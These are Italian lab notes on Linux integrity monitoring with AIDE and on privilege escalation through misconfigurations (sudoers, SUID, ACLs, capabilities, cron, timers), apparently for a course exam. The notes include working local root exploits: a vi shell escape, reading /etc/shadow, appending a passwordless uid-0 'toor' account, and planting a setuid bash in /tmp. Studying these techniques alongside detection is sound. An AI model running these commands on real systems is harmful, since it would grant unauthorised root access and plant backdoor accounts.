# Misconfiguration e Intrusion Detection

1. Strumenti per rivelare modifiche fatte a un sistema
2. Capire come alterazioni ai permessi possono concedere a un utente standard di guadagnare privilegi più elevati

# Configurazione di AIDE

È uno strumento per verificare l'integrità dei dati sul filesystem. Nel file ```/etc/aide.conf``` vediamo:

### Direttive DATABASE
- **database_out**: è lo snapshot creato sul filesystem, è il riferimento col quale viene confrontato il filesystem
- **database_in**: è il riferimento col quale viene confrontato il filesystem
- **database_new**: può essere usato per confrontare due database tra loro (in vs. new invece che in vs. filesystem corrente)

### Sezione GROUPS
Predispone nomi simbolici per set di controlli pre-aggregati

### Inclusione di file di configurazione

l'ultima riga ```@@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$``` istruisce AIDE a includere tutti i file di configurazione nella cartella menzionata

(editando il file come root) la commentiamo per ridurre i tempi dei test e la sostituiamo con una nostra direttiva semplice per controllare tutti i file dentro /bin e /usr/bin

```config
/bin  f  Full
/usr/bin  f  Full
```

## Avviamento
```sh
sudo aideinit

# per una "fotografia" più recente del fs:
sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
```

- TEST 1: file indesiderato

```sh
# creo un file indesiderato in /bin
touch /bin/indesiderato

# controllo l'integrità del filesystem
aide -C -c /etc/aide/aide.conf

```

- TEST 2: pacchetto insicuro

```sh
apt install -y hello-world_0.0.1-1.deb

aide -C -c /etc/aide/aide.conf
# OUTPUT:

```
# Misconfiguration e rispettive rilevazioni

## SUDOERS  

Voglio superare i permessi di un utente non privilegiato (user_test) per ottenere accesso root.

1. Aggiunta di quesra riga in sudo visudo: ```user_test ALL=(root) NOPASSWD:/usr/bin/vi /var/www/html/*```, 
per dargli accesso sudo senza password per eseguire **solo** vi e **solo** sul file in /var/www/html/*

2. *TIPS*: Per vedere cosa un utente privilegiato non può fare: ```sudo -l -U user_test```

3. Usiamo i privilegi:

- MODALITÀ 1: avvio shell
```sh
sudo /usr/bin/vi /var/www/html/file_a_caso # ho accesso qui
# se dentro vi digito: :!/bin/bash 
# verrà avviata una shell root senza password
# perchè vi è stato eseguito come root con sudo
```

- MODALITÀ 2: path trasversal
```sh
sudo /usr/bin/vi /var/www/html/../../../etc/shadow
```

- MODALITÀ 2: path trasversal
```sh
sudo /usr/bin/vi /var/www/html/../../../etc/shadow
```

## SUID

Voglio usare cp per copiare file di sistema protetti (come /etc/passwd e /etc/shadow) e modificarli indirettamente

1. Da root, assegniamo il SUID bit al comando cp ( chiunque esegua quel programma lo eseguirà con i privilegi dell'utente proprietario del file, root in questo caso )

```sh
chmod u+s /bin/cp
ls -al /bin/cp
```


2. Copio i file da modificare (come root)

```sh
cp /etc/passwd .
cp /etc/shadow .
ls -l

-rw-r--r-- 1 root vagrant 1503 Jun  1 17:38 passwd
-rw-r----- 1 root vagrant  864 Jun  1 17:39 shadow
```

3. Creo una copia dei file che posso leggere e scrivere, da poi copiare al posto di quelli originalis

```sh
cat passwd > pass.rw    # Crea una copia leggibile/scrivibile
cat shadow > shad.rw    # Stessa cosa per shadow
ls -l   
```

### Esempio interessante (aggiunta utente toor)

Precondizioni: è stato impostato il SUID a "cp"

```sh
cat /etc/passwd > passwd 

echo "toor::0:0::/root:/bin/bash" >> passwd # utente con permessi di root

cp passwd /etc/passwd # posso farlo per il suid attivo
```

4. *TIPS*:  La ricerca "a tappeto" di file e directory con permessi speciali settati si può fare con ```find / -perm /7000```
restringendola se è il caso coi normali filtri di find. La maschera 7000 include i file che abbiano uno qualsiasi dei bit speciali settato (4000 = UID + 2000 = GID + 1000 = TEMP)

## ACL

Le ACL POSIX sono un'estensione dei permessi standard, che permette di assegnarli specificamente a soggetti diversi da proprietario, gruppo proprietario, e "altri".

Modifica le Access Control List (ACL) del file /etc/sudoers per concedere i permessi specifici all'utente kali:
```sh
setfacl -m u:kali:rw /etc/sudoers
```

È usato per ottenere le ACL di un intero filesystem, in particolare a partire dalla radice "/":
```sh
getfacl -sR / 
```

# Esempio interessante:

AIDE esclude /etc/passwd come file da analizzare, possiamo usare ```getfacl /etc/passwd```.

```
─# getfacl /etc/passwd  
getfacl: Removing leading '/' from absolute path names
# file: etc/passwd
# owner: root
# group: root
user::rw-
user:spy:rw-                    #effective:r--
group::r--
mask::r--
other::r--

L'utente spy può modificare il file.

L'utente stesso è definito nel file:

└─# grep spy /etc/passwd
spy::5243:5243::/tmp:/bin/bash

senza password!

Chiunque puo diventare spy e modificare il suo id da 5234 a 0 per renderlo root
```

## CAPABILITIES

Sono gli specifici permessi di svolgere operazioni privilegiate, caratteristiche di root. Diventando root si acquisiscono tutte le capabilities esistenti, come visto i programmi SUID usano questo meccanismo per concedere azioni privilegiate a utenti standard.

Esempio: CAP_DAC_OVERRIDE: la possibilità di ignorare i permessi sul filesystem

```sh
sudo /usr/sbin/setcap "CAP_DAC_OVERRIDE=eip" /usr/bin/vim.tiny
#Assegna a vim.tiny la capacità (CAP_DAC_OVERRIDE) di ignorare i permessi di lettura/scrittura 
# sui file, anche quelli di sistema protetti.

getcap /path/to/file

```

Il comando `getcap` mostra le capabilities assegnate a un file. Le principali capabilities includono:

- **CAP_DAC_OVERRIDE**: Ignora i permessi di accesso al filesystem.
- **CAP_SYS_ADMIN**: Concede accesso a numerose operazioni amministrative.
- **CAP_NET_RAW**: Permette l'uso di socket raw e operazioni di rete a basso livello.
- **CAP_SETUID**: Consente di cambiare l'UID effettivo di un processo.
- **CAP_SETGID**: Consente di cambiare il GID effettivo di un processo.

Queste capabilities permettono di eseguire operazioni privilegiate senza dover essere root.

### Esempio interessante:

Precondizioni: a chmod è stata data la capability CAP_FOWNER, quindi può cambiare i permessi a qualsiasi file

```sh
# assegno la capability
sudo /usr/sbin/setcap "CAP_FOWNER+eip" /usr/bin/chmod 

chmod 666 /etc/passwd

echo "toor::0:0::/root:/bin/bash" >> /etc/passwd

chmod 644 /etc/passwd 	
```

## Processi nascosti
1. ```systemctl list timers```

**Escalation**: se un timer viene eseguito come root e l’utente può modificare lo script o la directory da cui viene eseguito, è un'escalation diretta.

2. ```atq```

**Escalation**: se un attaccante ha accesso a at e può eseguire job come root (per esempio via sudo o setuid su at), può eseguire un payload.

3. ```crontab -i```

**Escalation**: È stato definito un cronjob con script scrivibile:

```sh
crontab -i

# output
*/5 * * * * root /opt/scripts/backup.sh
# ha permessi root, ma è scrivibile da un utente non privilegiato

ls -l /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 1234 Jun 5 09:00 /opt/scripts/backup.sh

# se al backup.sh aggiungo la riga:
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
# L’utente user può poi semplicemente lanciare /tmp/rootbash e ottenere una shell root
```

# Esami su Privilege escalation

1) inizializzare aide: aideinit

2) copiare il database: sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

3) eseguire una scansione prima di lanciare il comando: sudo aide --config=/etc/aide/aide.conf --check

4) esegui il comando

5) eseguire di nuovo scansione sudo aide --config=/etc/aide/aide.conf --check

PRIVILEGE ESCALATION CON /USR/BIN/CP:
Per ottenere privilegi usando /usr/bin/cp, se ha il bit SUID settato, copiare /etc/passwd e shadow nella home usando cat /etc/passwd > file, poi aggiungici le righe sotto
passwd: toor:x:0:0:root:/root:/bin/bash
shadow: toor::19418:0:99999:7:::

poi esegui
/usr/bin/cp /home/kali/passwd /etc/passwd
/usr/bin/cp /home/kali/shadow /etc/shadow


per diventare toor: su toor 
